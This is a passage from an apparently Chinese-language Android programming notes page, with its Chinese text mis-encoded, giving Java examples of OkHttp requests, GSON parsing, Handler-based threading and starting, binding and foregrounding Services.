class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> StringBuilder <span class="title">getVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> version;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">                    Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                            .url(<span class="string">&quot;http://10.0.2.2:88/get_data.json&quot;</span>)</span><br><span class="line">                            .build();</span><br><span class="line">                    Response response = client.newCall(request).execute();</span><br><span class="line">                    String responseData = response.body().string();</span><br><span class="line">                    parseJSONWithGSON(responseData);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception e)</span><br><span class="line">                &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithGSON</span><span class="params">(String jsonData)</span></span>&#123;</span><br><span class="line">        Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">        List &lt;App&gt; appList = gson.fromJson(jsonData,<span class="keyword">new</span> TypeToken&lt;List&lt;App&gt;&gt;()&#123;&#125;.getType());</span><br><span class="line">        <span class="keyword">for</span>(App app: appList)</span><br><span class="line">        &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is&quot;</span>+app.getId());</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is&quot;</span>+app.getName());</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is&quot;</span>+app.getVersion());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="å°è£…ç½‘ç»œè¯·æ±‚"><a href="#å°è£…ç½‘ç»œè¯·æ±‚" class="headerlink" title="å°è£…ç½‘ç»œè¯·æ±‚"></a>å°è£…ç½‘ç»œè¯·æ±‚</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(v.getId() == R.id.send_request)</span><br><span class="line">           sendRequestWithOkHttp();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithOkHttp</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">try</span>&#123;</span><br><span class="line">                   String address = <span class="string">&quot;http://www.baidu.com&quot;</span>;</span><br><span class="line">                   Httputil.sendOkHttpRequest(address,<span class="keyword">new</span> Callback()</span><br><span class="line">                   &#123;</span><br><span class="line">                       <span class="meta">@Override</span></span><br><span class="line">                       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(<span class="meta">@NotNull</span> Call call, <span class="meta">@NotNull</span> IOException e)</span> </span>&#123;</span><br><span class="line">                           <span class="comment">//                            å¼‚å¸¸å¤„ç†æƒ…å†µ</span></span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                       <span class="meta">@Override</span></span><br><span class="line">                       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(<span class="meta">@NotNull</span> Call call, <span class="meta">@NotNull</span> Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                           <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">//å¾—åˆ°æœåŠ¡å™¨çš„è¿”å›çš„å…·ä½“å†…å®¹</span></span><br><span class="line">                               String responseData = response.body().string();</span><br><span class="line">                               Log.d(<span class="string">&quot;Main&quot;</span>, responseData);</span><br><span class="line">                           &#125;</span><br><span class="line">                           <span class="keyword">catch</span> (Exception e1)</span><br><span class="line">                           &#123;</span><br><span class="line">                               e1.printStackTrace();</span><br><span class="line">                           &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">catch</span> (Exception e)</span><br><span class="line">               &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;).start();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h2 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h2><h3 id="ä¾‹å­ï¼Œå­çº¿ç¨‹æ›´æ”¹ui-å®‰å“å¤šçº¿ç¨‹"><a href="#ä¾‹å­ï¼Œå­çº¿ç¨‹æ›´æ”¹ui-å®‰å“å¤šçº¿ç¨‹" class="headerlink" title="ä¾‹å­ï¼Œå­çº¿ç¨‹æ›´æ”¹ui,å®‰å“å¤šçº¿ç¨‹"></a>ä¾‹å­ï¼Œå­çº¿ç¨‹æ›´æ”¹ui,å®‰å“å¤šçº¿ç¨‹</h3><p>androidåœ¨å­çº¿ç¨‹ä¸­ä¸èƒ½ç›´æ¥å¯¹uiè¿›è¡Œæ“ä½œï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> TextView text;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UPDATE_TEXT = <span class="number">1</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        text = (TextView) findViewById(R.id.text);</span><br><span class="line">        Button changeText = (Button) findViewById(R.id.change_text);</span><br><span class="line">        changeText.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler()</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        @SuppressLint(&quot;HandlerLeak&quot;)</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">switch</span> (msg.what)&#123;</span><br><span class="line">                <span class="keyword">case</span> UPDATE_TEXT:</span><br><span class="line">                    text.setText(<span class="string">&quot;nice to meet you&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.change_text:</span><br><span class="line">                <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//         ä¸èƒ½è¿™ä¹ˆå¹²ï¼Œéœ€æ–°å»ºä¸€ä¸ªMessageç”¨äºä¼ å€¼               text.setText(&quot;nice to meet you&quot;);</span></span><br><span class="line">                        Message message = <span class="keyword">new</span> Message();</span><br><span class="line">                        message.what = UPDATE_TEXT;</span><br><span class="line">                        handler.sendMessage(message);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å¼‚æ­¥æ¶ˆæ¯å¤„ç†æœºåˆ¶"><a href="#å¼‚æ­¥æ¶ˆæ¯å¤„ç†æœºåˆ¶" class="headerlink" title="å¼‚æ­¥æ¶ˆæ¯å¤„ç†æœºåˆ¶"></a>å¼‚æ­¥æ¶ˆæ¯å¤„ç†æœºåˆ¶</h3><ol>
<li><p><strong>Message</strong></p>
<p>Messageæ˜¯åœ¨çº¿ç¨‹ä¹‹é—´ä¼ é€’çš„æ¶ˆæ¯ï¼Œå®ƒå¯ä»¥åœ¨å†…éƒ¨æºå¸¦å°‘é‡çš„ä¿¡æ¯ï¼Œç”¨äºåœ¨ä¸åŒçº¿ç¨‹ä¹‹é—´äº¤æ¢æ•°æ®ã€‚ä¸Šä¸€å°èŠ‚ä¸­æˆ‘ä»¬ä½¿ç”¨åˆ°äº†Messageçš„<code>what</code> å­—æ®µï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥ä½¿ç”¨<code>arg1</code> å’Œ<code>arg2</code> å­—æ®µæ¥æºå¸¦ä¸€äº›æ•´å‹æ•°æ®ï¼Œä½¿ç”¨<code>obj</code> å­—æ®µæºå¸¦ä¸€ä¸ª<code>Object</code> å¯¹è±¡ã€‚</p>
</li>
<li><p><strong>Handler</strong></p>
<p>Handleré¡¾åæ€ä¹‰ä¹Ÿå°±æ˜¯å¤„ç†è€…çš„æ„æ€ï¼Œå®ƒä¸»è¦æ˜¯ç”¨äºå‘é€å’Œå¤„ç†æ¶ˆæ¯çš„ã€‚å‘é€æ¶ˆæ¯ä¸€èˆ¬æ˜¯ä½¿ç”¨Handlerçš„<code>sendMessage()</code> æ–¹æ³•ï¼Œè€Œå‘å‡ºçš„æ¶ˆæ¯ç»è¿‡ä¸€ç³»åˆ—åœ°è¾—è½¬å¤„ç†åï¼Œæœ€ç»ˆä¼šä¼ é€’åˆ°Handlerçš„<code>handleMessage()</code> æ–¹æ³•ä¸­ã€‚</p>
</li>
<li><p><strong>MessageQueue</strong></p>
<p>MessageQueueæ˜¯æ¶ˆæ¯é˜Ÿåˆ—çš„æ„æ€ï¼Œå®ƒä¸»è¦ç”¨äºå­˜æ”¾æ‰€æœ‰é€šè¿‡Handlerå‘é€çš„æ¶ˆæ¯ã€‚è¿™éƒ¨åˆ†æ¶ˆæ¯ä¼šä¸€ç›´å­˜åœ¨äºæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç­‰å¾…è¢«å¤„ç†ã€‚æ¯ä¸ªçº¿ç¨‹ä¸­åªä¼šæœ‰ä¸€ä¸ª<code>MessageQueue</code> å¯¹è±¡ã€‚</p>
</li>
<li><p><strong>Looper</strong></p>
<p>Looperæ˜¯æ¯ä¸ªçº¿ç¨‹ä¸­çš„MessageQueueçš„ç®¡å®¶ï¼Œè°ƒç”¨Looperçš„<code>loop()</code> æ–¹æ³•åï¼Œå°±ä¼šè¿›å…¥åˆ°ä¸€ä¸ªæ— é™å¾ªç¯å½“ä¸­ï¼Œç„¶åæ¯å½“å‘ç°MessageQueueä¸­å­˜åœ¨ä¸€æ¡æ¶ˆæ¯ï¼Œå°±ä¼šå°†å®ƒå–å‡ºï¼Œå¹¶ä¼ é€’åˆ°Handlerçš„<code>handleMessage()</code> æ–¹æ³•ä¸­ã€‚æ¯ä¸ªçº¿ç¨‹ä¸­ä¹Ÿåªä¼šæœ‰ä¸€ä¸ª<code>Looper</code> å¯¹è±¡ã€‚</p>
</li>
</ol>
<p>äº†è§£äº†Messageã€Handlerã€MessageQueueä»¥åŠLooperçš„åŸºæœ¬æ¦‚å¿µåï¼Œæˆ‘ä»¬å†æ¥æŠŠå¼‚æ­¥æ¶ˆæ¯å¤„ç†çš„æ•´ä¸ªæµç¨‹æ¢³ç†ä¸€éã€‚é¦–å…ˆéœ€è¦åœ¨ä¸»çº¿ç¨‹å½“ä¸­åˆ›å»ºä¸€ä¸ª<code>Handler</code> å¯¹è±¡ï¼Œå¹¶é‡å†™<code>handleMessage()</code> æ–¹æ³•ã€‚ç„¶åå½“å­çº¿ç¨‹ä¸­éœ€è¦è¿›è¡ŒUIæ“ä½œæ—¶ï¼Œå°±åˆ›å»ºä¸€ä¸ª<code>Message</code> å¯¹è±¡ï¼Œå¹¶é€šè¿‡Handlerå°†è¿™æ¡æ¶ˆæ¯å‘é€å‡ºå»ã€‚ä¹‹åè¿™æ¡æ¶ˆæ¯ä¼šè¢«æ·»åŠ åˆ°MessageQueueçš„é˜Ÿåˆ—ä¸­ç­‰å¾…è¢«å¤„ç†ï¼Œè€ŒLooperåˆ™ä¼šä¸€ç›´å°è¯•ä»MessageQueueä¸­å–å‡ºå¾…å¤„ç†æ¶ˆæ¯ï¼Œæœ€ååˆ†å‘å›Handlerçš„<code>handleMessage()</code> æ–¹æ³•ä¸­ã€‚ç”±äºHandleræ˜¯åœ¨ä¸»çº¿ç¨‹ä¸­åˆ›å»ºçš„ï¼Œæ‰€ä»¥æ­¤æ—¶<code>handleMessage()</code> æ–¹æ³•ä¸­çš„ä»£ç ä¹Ÿä¼šåœ¨ä¸»çº¿ç¨‹ä¸­è¿è¡Œï¼Œäºæ˜¯æˆ‘ä»¬åœ¨è¿™é‡Œå°±å¯ä»¥å®‰å¿ƒåœ°è¿›è¡ŒUIæ“ä½œäº†ã€‚æ•´ä¸ªå¼‚æ­¥æ¶ˆæ¯å¤„ç†æœºåˆ¶çš„æµç¨‹ç¤ºæ„å›¾å¦‚å›¾</p>
<p><img src="http://reader.epubee.com/books/mobile/32/329412efee610df045d528feddfae349/Image00250.jpg"></p>
<h3 id="å¯åŠ¨æœåŠ¡"><a href="#å¯åŠ¨æœåŠ¡" class="headerlink" title="å¯åŠ¨æœåŠ¡"></a>å¯åŠ¨æœåŠ¡</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®šä¹‰ä¸¤ä¸ªidä¸ºstop_service å’Œstart_service çš„æŒ‰é’®,MainActivity</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button startService  = (Button)findViewById(R.id.start_service);</span><br><span class="line">        Button stopService = (Button) findViewById(R.id.stop_service);</span><br><span class="line">        startService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">        stopService.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.start_service:</span><br><span class="line">                Intent startIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.class);<span class="comment">//æ„é€ intentå¯åŠ¨æœåŠ¡</span></span><br><span class="line">                startService(startIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.stop_service:</span><br><span class="line">                Intent stopIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.class);</span><br><span class="line">                stopService(stopIntent);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å³é”®æ–°å»ºä¸€ä¸ªæœåŠ¡ï¼Œå‘½åä¸ºMyService </span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Return the communication channel to the service.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//ä»…åœ¨ç¬¬ä¸€æ¬¡å¯åŠ¨æ—¶è¿è¡Œ</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onCreate: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> startId)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//æ¯æ¬¡ç‚¹å‡»å¼€å§‹æœåŠ¡æŒ‰é’®éƒ½ä¼šè¿è¡Œ</span></span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onStartCommand: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDestroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//é”€æ¯æœåŠ¡æ—¶è¿è¡Œ</span></span><br><span class="line">        <span class="keyword">super</span>.onDestroy();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onDestroy: &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="æ´»åŠ¨æœåŠ¡é€šä¿¡ç»‘å®š-bind"><a href="#æ´»åŠ¨æœåŠ¡é€šä¿¡ç»‘å®š-bind" class="headerlink" title="æ´»åŠ¨æœåŠ¡é€šä¿¡ç»‘å®š(bind)"></a>æ´»åŠ¨æœåŠ¡é€šä¿¡ç»‘å®š(bind)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MyService æ·»åŠ ä¸€ä¸ªç±»</span></span><br><span class="line">    <span class="keyword">private</span> DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;startDownload: &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getProgress</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;getProgress: &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//é‡è½½ç»å¯¹æ–¹æ³•IBinder</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mBinder;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MainActivity</span></span><br><span class="line"> <span class="keyword">private</span> MyService.DownloadBinder downloadBinder;<span class="comment">//MyService ä¸­çš„ç±»å®ä¾‹</span></span><br><span class="line">    <span class="keyword">private</span> ServiceConnection connection = <span class="keyword">new</span> ServiceConnection() &#123;<span class="comment">//è¿æ¥æœåŠ¡</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceConnected</span><span class="params">(ComponentName name, IBinder service)</span> </span>&#123;</span><br><span class="line">            downloadBinder = (MyService.DownloadBinder) service;<span class="comment">//è½¬å‹æˆdownloadBinder</span></span><br><span class="line">            <span class="comment">//è°ƒç”¨æœåŠ¡ä¸­å®šä¹‰çš„æ–¹æ³•</span></span><br><span class="line">            downloadBinder.startDownload();</span><br><span class="line">            downloadBinder.getProgress();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onServiceDisconnected</span><span class="params">(ComponentName name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//in OnClick() æ·»åŠ æŒ‰é’®ï¼ŒæŒ‰ä¸‹ç»‘å®šæœåŠ¡æŒ‰é’®ä¼šå¯åŠ¨æœåŠ¡å¹¶ä¸”æ‰§è¡ŒonServiceConnectedä¸­çš„ä»£ç </span></span><br><span class="line"> 			<span class="keyword">case</span> R.id.bind_service:</span><br><span class="line">                Intent bindIntent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, MyService.class);</span><br><span class="line">                bindService(bindIntent, connection, BIND_AUTO_CREATE); <span class="comment">// ç»‘å®šæœåŠ¡</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.unbind_service:</span><br><span class="line">                unbindService(connection); <span class="comment">// è§£ç»‘æœåŠ¡</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="å‰å°æœåŠ¡"><a href="#å‰å°æœåŠ¡" class="headerlink" title="å‰å°æœåŠ¡"></a>å‰å°æœåŠ¡</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ä¿®æ”¹MyServiceä»£ç ä¸º</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Channel ID å¿…é¡»ä¿è¯å”¯ä¸€ï¼Œä¿®æ”¹ç‚¹</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String CHANNEL_ID = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> NOTIFICATION_ID = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *é€šè¿‡é€šçŸ¥å¯åŠ¨å‰å°æœåŠ¡,ä¿®æ”¹ç‚¹</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@androidx</span>.annotation.RequiresApi(api = Build.VERSION_CODES.O)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">setForegroundService</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è®¾å®šçš„é€šçŸ¥æ¸ é“åç§°</span></span><br><span class="line">        String channelName = <span class="string">&quot;hello&quot;</span>;<span class="comment">//getString(R.string.channel_name);</span></span><br><span class="line">        <span class="comment">//è®¾ç½®é€šçŸ¥çš„é‡è¦ç¨‹åº¦</span></span><br><span class="line">        <span class="keyword">int</span> importance = NotificationManager.IMPORTANCE_LOW;</span><br><span class="line">        <span class="comment">//æ„å»ºé€šçŸ¥æ¸ é“</span></span><br><span class="line">        NotificationChannel channel = <span class="keyword">new</span> NotificationChannel(CHANNEL_ID, channelName, importance);</span><br><span class="line">        channel.setDescription(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//åœ¨åˆ›å»ºçš„é€šçŸ¥æ¸ é“ä¸Šå‘é€é€šçŸ¥</span></span><br><span class="line">        NotificationCompat.Builder builder = <span class="keyword">new</span> NotificationCompat.Builder(<span class="keyword">this</span>, CHANNEL_ID);</span><br><span class="line">        builder.setSmallIcon(R.drawable.ic_launcher_background) <span class="comment">//è®¾ç½®é€šçŸ¥å›¾æ ‡</span></span><br><span class="line">                .setContentTitle(<span class="string">&quot;notificationTitle&quot;</span>)<span class="comment">//è®¾ç½®é€šçŸ¥æ ‡é¢˜</span></span><br><span class="line">                .setContentText(<span class="string">&quot;notificationContent&quot;</span>)<span class="comment">//è®¾ç½®é€šçŸ¥å†…å®¹</span></span><br><span class="line">                .setAutoCancel(<span class="keyword">true</span>) <span class="comment">//ç”¨æˆ·è§¦æ‘¸æ—¶ï¼Œè‡ªåŠ¨å…³é—­</span></span><br><span class="line">                .setOngoing(<span class="keyword">true</span>);<span class="comment">//è®¾ç½®å¤„äºè¿è¡ŒçŠ¶æ€</span></span><br><span class="line">        <span class="comment">//å‘ç³»ç»Ÿæ³¨å†Œé€šçŸ¥æ¸ é“ï¼Œæ³¨å†Œåä¸èƒ½æ”¹å˜é‡è¦æ€§ä»¥åŠå…¶ä»–é€šçŸ¥è¡Œä¸º</span></span><br><span class="line">        NotificationManager notificationManager = (NotificationManager) getSystemService( Context.NOTIFICATION_SERVICE);</span><br><span class="line">        notificationManager.createNotificationChannel(channel);</span><br><span class="line">        <span class="comment">//å°†æœåŠ¡ç½®äºå¯åŠ¨çŠ¶æ€ NOTIFICATION_IDæŒ‡çš„æ˜¯åˆ›å»ºçš„é€šçŸ¥çš„ID</span></span><br><span class="line">        startForeground(NOTIFICATION_ID,builder.build());<span class="comment">//ä¸¤ä¸ªå‚æ•°int,Notificationï¼Œå¯ç”¨å‰å°æœåŠ¡å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é€šçŸ¥idï¼Œç¬¬äºŒä¸ªæ˜¯é€šçŸ¥</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> DownloadBinder mBinder = <span class="keyword">new</span> DownloadBinder();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadBinder</span> <span class="keyword">extends</span> <span class="title">Binder</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownload</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;startDownload: &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span 